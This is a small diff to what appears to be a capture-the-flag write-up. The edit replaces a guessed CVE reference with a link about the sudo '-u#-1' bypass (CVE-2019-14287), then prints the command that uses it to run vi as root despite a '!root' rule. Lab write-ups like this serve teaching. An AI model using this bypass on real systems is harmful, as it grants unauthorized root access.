@@ -376,7 +376,7 @@ User gwendoline may run the following commands on year-of-the-rabbit:
     (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
 ```
 👀 (ALL, !root)
-CVE-2021-3156 ??
+https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability
 
 ```
 gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
